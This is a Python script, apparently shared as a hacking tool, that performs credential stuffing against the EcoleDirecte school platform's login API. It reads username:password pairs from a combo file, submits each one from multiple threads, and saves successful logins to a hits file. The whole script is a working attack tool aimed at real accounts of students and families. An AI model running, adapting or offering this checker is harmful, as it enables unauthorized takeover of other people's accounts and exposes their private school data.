import time
import requests
import json
from colorama import init,Fore
from os import system
import ctypes
import threading
init()

system("cls ")

url = "https://api.ecoledirecte.com/v3/login.awp"
headers = {}

combo = open('combo.txt', "r")

ctypes.windll.kernel32.SetConsoleTitleW(' [EcolDirect Checker | DK16#002 <3]   Loading...')  


good = 0
bad = 0
threadcount = 0
threads = []
cpmcount = 0

lock = threading.Lock()





def check():
    global good,bad
    for ligne in combo:
        acc = ligne.strip()
        user = acc.split(':')

        ################################################################################
        #a optimiser vraiment pas perforement 
        payload = "data={\n\t\"identifiant\": \"USER1\",\n\t\"motdepasse\": \"MDP2\"\n}"
        payload = payload.replace("USER1", user[0])
        payload = payload.replace("MDP2", user[1])
        ################################################################################
        r = requests.request("POST", url, headers=headers, data=payload)
        time.sleep(0.1)
        y = json.loads(r.text)
        if y["code"] == 200:
            print(Fore.GREEN + "[+]Hit:",acc,"code:",y["code"])
            hit = open("hit.txt", "a")
            hit.write("\n")
            hit.write(acc)
            good +=1 
        else:
            print(Fore.RED + "[+]Bad:",acc,"code:",y["code"])
            bad +=1





def title():
    while True:
        ctypes.windll.kernel32.SetConsoleTitleW(f'[EcolDirect Checker by DK16#002] Hit:{good}   |   Bad:{bad}  | threads:{threading.active_count()}')



def start():
    global threadcount
    print(Fore.GREEN + f'''

    $$$$$$$$\                    $$\           $$$$$$$\  $$\                                 $$\     
    $$  _____|                   $$ |          $$  __$$\ \__|                                $$ |    
    $$ |      $$$$$$$\  $$$$$$\  $$ | $$$$$$\  $$ |  $$ |$$\  $$$$$$\   $$$$$$\   $$$$$$$\ $$$$$$\   
    $$$$$\   $$  _____|$$  __$$\ $$ |$$  __$$\ $$ |  $$ |$$ |$$  __$$\ $$  __$$\ $$  _____|\_$$  _|  
    $$  __|  $$ /      $$ /  $$ |$$ |$$$$$$$$ |$$ |  $$ |$$ |$$ |  \__|$$$$$$$$ |$$ /        $$ |    
    $$ |     $$ |      $$ |  $$ |$$ |$$   ____|$$ |  $$ |$$ |$$ |      $$   ____|$$ |        $$ |$$\ 
    $$$$$$$$\\$$$$$$$\ \$$$$$$  |$$ |\$$$$$$$\ $$$$$$$  |$$ |$$ |      \$$$$$$$\ \$$$$$$$\   \$$$$  |
    \________|\_______| \______/ \__| \_______|\_______/ \__|\__|       \_______| \_______|   \____/ 



    $$$$$$\  $$\                                     $$\                                            
    $$  __$$\ $$ |                                    $$ |                                           
    $$ /  \__|$$$$$$$\   $$$$$$\    $$$$$$$\ $$ |  $$\  $$$$$$\   $$$$$$\                   
    $$ |      $$  __$$\ $$  __$$\  $$  _____|$$ | $$  |$$  __$$\ $$  __$$\                  
    $$ |      $$ |  $$ |$$$$$$$$ ||$$ /      $$$$$$  / $$$$$$$$ |$$ |  \__|                 
    $$ |  $$\ $$ |  $$ |$$   ____||$$ |      $$  _$$<  $$   ____|$$ |                       
    \$$$$$$  |$$ |  $$ |\$$$$$$$\  \$$$$$$$\ $$ | \$$\ \$$$$$$$\ $$ |                       
     \______/ \__|  \__| \_______|  \_______|\__|  \__| \_______|\__|                       

                             
                                                                                               
                                                                                                 
                  
                                                                                     ''')
    print(Fore.RED + "                              Dev By DK16")
    threadcount = int(input('Nombre de thread:'))




start()

start = time.time()
threading.Thread(target=title,daemon=True).start()

for i in range(threadcount):
    t = threading.Thread(target=check)
    threads.append(t)
    t.start()
for t in threads:
    t.join()